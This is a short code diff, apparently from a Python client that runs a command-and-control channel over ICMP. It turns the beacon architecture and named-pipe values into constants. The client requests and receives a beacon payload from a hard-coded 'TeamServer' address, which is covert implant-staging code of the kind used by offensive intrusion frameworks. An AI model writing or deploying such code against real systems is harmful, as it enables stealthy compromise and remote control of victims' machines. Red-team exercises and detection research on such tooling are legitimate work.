@@ -17,6 +17,8 @@ MAX_DATA_PER_CHUNK = ICMP_PAYLOAD_SIZE - TAG_SIZE  # 996
 
 TEAMSERVER_IP = "10.10.10.21"
 TEAMSERVER_PORT = 2222
+BEACON_PIPENAME = "foobar"
+BEACON_ARCH = "x86"  # options: `x86`, `x64`
 
 
 class Client:
@@ -100,8 +102,8 @@ class Client:
         Get payload from TeamServer
         """
         logging.info(f"[+] Getting Payload from {TEAMSERVER_IP}:{TEAMSERVER_PORT}")
-        self.ts_send_frame(b"arch=x86")
-        self.ts_send_frame(b"pipename=foobar")
+        self.ts_send_frame(f"arch={BEACON_ARCH}".encode())
+        self.ts_send_frame(f"pipename={BEACON_PIPENAME}".encode())
         self.ts_send_frame(b"block=100")
         self.ts_send_frame(b"go")
         self.payload = self.ts_recv_frame()
